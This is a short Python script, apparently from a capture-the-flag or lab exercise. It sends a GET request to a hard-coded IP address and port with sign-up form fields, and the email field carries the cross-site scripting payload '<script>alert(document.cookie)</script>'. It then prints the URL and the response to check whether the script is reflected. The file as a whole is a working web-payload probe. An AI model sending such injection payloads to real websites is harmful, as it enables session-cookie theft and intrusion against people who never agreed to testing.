import requests

url = "http://161.35.173.232:31690/"

# ?fullname=test&username=username&password=password&email=test%40test.com
params = {
	"fullname": "test",
	"username": "username",
	"password": "password",
	"email": "<script>alert(document.cookie)</script>"
}

r = requests.get(url, params=params)
print(r.url)
print(r.text)